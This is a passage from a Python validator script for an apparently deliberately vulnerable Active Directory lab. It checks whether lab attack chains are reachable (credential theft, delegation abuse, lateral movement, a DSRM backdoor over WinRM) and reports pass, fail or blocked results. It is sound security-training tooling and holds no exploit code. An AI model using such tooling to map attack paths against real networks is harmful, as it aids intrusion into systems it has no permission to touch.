            return _pass("PER-025", f"WinRM reachable on {dc} — DSRM backdoor configurable with DA creds")
        return _fail("PER-025", "", f"WinRM port 5985 not reachable on {dc}")
    except Exception as exc:
        return _fail("PER-025", "", str(exc))


# ─────────────────────────────────────────────────────────────────────────────
# Helper: re-tag a CheckResult with a different attack_id
# ─────────────────────────────────────────────────────────────────────────────

def _wrap_as(result: CheckResult, new_id: str) -> CheckResult:
    return CheckResult(
        attack_id=new_id,
        passed=result.passed,
        output=result.output,
        error=result.error,
        skipped=result.skipped,
        skip_reason=result.skip_reason,
    )


# ─────────────────────────────────────────────────────────────────────────────
# Checker registry  {attack_id → callable(config) → CheckResult}
# ─────────────────────────────────────────────────────────────────────────────

CHECKERS: Dict[str, callable] = {
    "IA-002":   check_IA_002,
    "IA-005":   check_IA_005,
    "IA-006":   check_IA_006,
    "IA-007":   check_IA_007,
    "IA-008":   check_IA_008,
    "IA-011":   check_IA_011,
    "IA-012":   check_IA_012,
    "ENUM-001": check_ENUM_001,
    "ENUM-021": check_ENUM_021,
    "CRED-001": check_CRED_001,
    "CRED-002": check_CRED_002,
    "CRED-013": check_CRED_013,
    "CRED-016": check_CRED_016,
    "CRED-020": check_CRED_020,
    "DF-012":   check_DF_012,
    "DF-011":   check_DF_011,
    "DF-019":   check_DF_019,
    "DF-001":   check_DF_001,
    "DF-007":   check_DF_007,
    "DF-006":   check_DF_006,
    "DF-008":   check_DF_008,
    "LAT-011":  check_LAT_011,
    "LAT-012":  check_LAT_012,
    "LAT-016":  check_LAT_016,
    "PE-001":   check_PE_001,
    "PE-005":   check_PE_005,
    "PER-018":  check_PER_018,
    "PER-023":  check_PER_023,
    "PER-025":  check_PER_025,
}


# ─────────────────────────────────────────────────────────────────────────────
# Graph traversal
# ─────────────────────────────────────────────────────────────────────────────

def topo_sort_from(start_id: str, graph: Dict[str, List[str]]) -> List[str]:
    """
    Return a list of node IDs in topological order (prereqs first) starting from
    *start_id* and including all transitive prerequisites.
    Uses iterative DFS + post-order insertion.
    """
    visited: Set[str] = set()
    order:   List[str] = []

    def dfs(node: str):
        if node in visited:
            return
        visited.add(node)
        for prereq in graph.get(node, []):
            dfs(prereq)
        order.append(node)

    dfs(start_id)
    return order


def validate_chain(
    start_id: str,
    graph: Dict[str, List[str]],
    checkers: Dict[str, callable],
    config: dict,
) -> List[CheckResult]:
    """
    Run all checks needed to reach *start_id*, in topological order.
    Stop at first FAIL (BLOCKED) — do not run dependents of a failed check.
    Skip nodes that have no registered checker.
    """
    nodes = topo_sort_from(start_id, graph)
    results: List[CheckResult] = []
    blocked: Set[str] = set()

    for node_id in nodes:
        # Check if any prereq failed / was blocked
        prereqs = graph.get(node_id, [])
        if any(p in blocked for p in prereqs):
            r = CheckResult(
                attack_id=node_id,
                passed=False,
                output="",
                error="BLOCKED — prerequisite failed",
                skipped=True,
                skip_reason="prerequisite failed or blocked",
            )
            results.append(r)
            blocked.add(node_id)
            continue

        if node_id not in checkers:
            r = CheckResult(
                attack_id=node_id,
                passed=True,
                output="No checker registered — assuming reachable",
                skipped=True,
                skip_reason="no checker registered",
            )
            results.append(r)
            continue

        r = checkers[node_id](config)
        results.append(r)

        if not r.passed and not r.skipped:
            blocked.add(node_id)

    return results


def validate_all(
    graph: Dict[str, List[str]],
    checkers: Dict[str, callable],
    config: dict,
    chain_filter: Optional[str] = None,
) -> Dict[str, List[CheckResult]]:
    """
    Run all named chains (or just the one matching *chain_filter*).
    Returns {chain_name: [CheckResult, ...]}.
    Cache results per node across chains to avoid running the same check twice.
    """
    cache: Dict[str, CheckResult] = {}
    chain_results: Dict[str, List[CheckResult]] = {}

    def cached_check(node_id: str) -> CheckResult:
        if node_id not in cache:
            if node_id in checkers:
                cache[node_id] = checkers[node_id](config)
            else:
                cache[node_id] = CheckResult(
                    attack_id=node_id,
                    passed=True,
                    output="No checker — assumed reachable",
                    skipped=True,
                    skip_reason="no checker registered",
                )
        return cache[node_id]

    for chain_name, node_ids in NAMED_CHAINS.items():
        if chain_filter and chain_filter not in chain_name and chain_filter not in node_ids:
            continue
        results: List[CheckResult] = []
        blocked: Set[str] = set()
        for node_id in node_ids:
            prereqs = graph.get(node_id, [])
            if any(p in blocked for p in prereqs):
                r = CheckResult(
                    attack_id=node_id,
                    passed=False,
                    output="",
                    error="BLOCKED",
                    skipped=True,
                    skip_reason="prerequisite failed",
                )
                results.append(r)
                blocked.add(node_id)
                continue
            r = cached_check(node_id)
            results.append(r)
            if not r.passed and not r.skipped:
                blocked.add(node_id)
        chain_results[chain_name] = results

    return chain_results


# ─────────────────────────────────────────────────────────────────────────────
# Output / reporting
# ─────────────────────────────────────────────────────────────────────────────

# ANSI
G   = "\033[0;32m"
R   = "\033[0;31m"
Y   = "\033[1;33m"
C   = "\033[0;36m"
BLD = "\033[1m"
NC  = "\033[0m"

def _result_line(r: CheckResult) -> str:
    if r.skipped:
        reason = r.skip_reason or "skipped"
        if "BLOCKED" in (r.error or "") or "prerequisite" in reason:
            tag = f"{R}BLOCK{NC}"
        else:
            tag = f"{Y}SKIP {NC}"
        return f"  {r.attack_id:<10} {tag}  {reason}"
    if r.passed:
        name = ATTACK_NAMES.get(r.attack_id, "")
        out  = r.output[:80].replace("\n", " ")
        return f"  {r.attack_id:<10} {G}PASS{NC}  {name}: {out}"
    name = ATTACK_NAMES.get(r.attack_id, "")
    err  = (r.error or r.output or "")[:80].replace("\n", " ")
    return f"  {r.attack_id:<10} {R}FAIL{NC}  {name}: {err}"


def print_chain_results(chain_results: Dict[str, List[CheckResult]]):
    total_pass = total_fail = total_skip = 0
    for chain_name, results in chain_results.items():
        chain_pass = all(r.passed or r.skipped for r in results)
        marker = f"{G}OK{NC}" if chain_pass else f"{R}FAIL{NC}"
        print(f"\n{BLD}Attack Chain: {chain_name}  [{marker}{BLD}]{NC}")
        for r in results:
            print(_result_line(r))
            if r.passed:          total_pass += 1
            elif r.skipped:       total_skip += 1
            else:                 total_fail += 1

    print(f"\n{BLD}{'=' * 60}{NC}")
    print(f"{BLD}Summary:{NC}  "
          f"{G}PASS {total_pass}{NC}  "
          f"{R}FAIL {total_fail}{NC}  "
          f"{Y}SKIP {total_skip}{NC}")
    print()


def list_chains():
    """Print all defined chains and their nodes."""
    print(f"\n{BLD}Defined attack chains:{NC}\n")
    for i, (name, nodes) in enumerate(NAMED_CHAINS.items(), 1):
        print(f"  {i:2}. {name}")
        for node_id in nodes:
            prereqs = ATTACK_GRAPH.get(node_id, [])
            desc    = ATTACK_NAMES.get(node_id, "")
            prereq_str = f" (needs: {', '.join(prereqs)})" if prereqs else ""
            print(f"        {node_id:<12} {desc}{prereq_str}")
        print()


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def build_config(args: argparse.Namespace) -> dict:
    return {
        "dc_ip":       args.dc_ip,
        "dc_eu_ip":    args.dc_eu_ip  or args.dc_ip,
        "ca_ip":       args.ca_ip     or args.dc_ip,
        "file_ip":     args.file_ip   or args.dc_ip,
        "sql_ip":      args.sql_ip    or args.dc_ip,
        "ws_ip":       args.ws_ip     or args.dc_ip,
        "fin_dc_ip":   args.fin_dc_ip or args.dc_ip,
        "root_dc_ip":  args.root_dc_ip or args.dc_ip,
        "domain":      args.domain,
        "attacker_ip": args.attacker_ip,
        "on_l2":       args.on_l2,
    }


def main():
    parser = argparse.ArgumentParser(
        prog="validator.py",
        description="DVAD Attack Chain Validator — graph-based end-to-end chain validation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 chains/validator.py --dc-ip 10.10.0.10 --domain corp.local --attacker-ip 10.10.0.1
  python3 chains/validator.py --chain "DF-001"
  python3 chains/validator.py --list-chains
  python3 chains/validator.py --dc-ip 10.10.0.10 --domain corp.local --json
        """,
    )

    # Required (when not using --list-chains)
    parser.add_argument("--dc-ip",       metavar="IP",   default="10.10.0.10",
                        help="Corp DC IP (default: 10.10.0.10)")
    parser.add_argument("--domain",      metavar="FQDN", default="corp.local",
                        help="AD domain FQDN (default: corp.local)")
    parser.add_argument("--attacker-ip", metavar="IP",   default="10.10.0.1",
                        help="Attacker box IP (default: 10.10.0.1)")

    # Optional per-host overrides
    parser.add_argument("--dc-eu-ip",   metavar="IP", default=None, help="EU child DC IP")
    parser.add_argument("--ca-ip",      metavar="IP", default=None, help="CA / ADCS server IP")
    parser.add_argument("--file-ip",    metavar="IP", default=None, help="File server IP")
    parser.add_argument("--sql-ip",     metavar="IP", default=None, help="SQL server IP")
    parser.add_argument("--ws-ip",      metavar="IP", default=None, help="Workstation IP")
    parser.add_argument("--fin-dc-ip",  metavar="IP", default=None, help="Finance domain DC IP")
    parser.add_argument("--root-dc-ip", metavar="IP", default=None, help="Root domain DC IP")
    parser.add_argument("--on-l2",      action="store_true",
                        help="Set if attacker is on the dvad-ctf L2 bridge (enables LLMNR checks)")

    # Mode flags
    parser.add_argument("--chain",       metavar="ID_OR_NAME",
                        help="Validate only chains containing this attack ID or chain name fragment")
    parser.add_argument("--list-chains", action="store_true",
                        help="List all defined attack chains and exit")
    parser.add_argument("--json",        action="store_true",
                        help="Output results as JSON")

    args = parser.parse_args()

    if args.list_chains:
        list_chains()
        sys.exit(0)

    config = build_config(args)

    chain_results = validate_all(
        ATTACK_GRAPH,
        CHECKERS,
        config,
        chain_filter=args.chain,
    )

    if args.json:
        output = {}
        for chain_name, results in chain_results.items():
            output[chain_name] = [asdict(r) for r in results]
        print(json.dumps(output, indent=2))
    else:
        print_chain_results(chain_results)

    # Exit 1 if any chain has an outright FAIL (not just SKIP)
    for results in chain_results.values():
        for r in results:
            if not r.passed and not r.skipped:
                sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
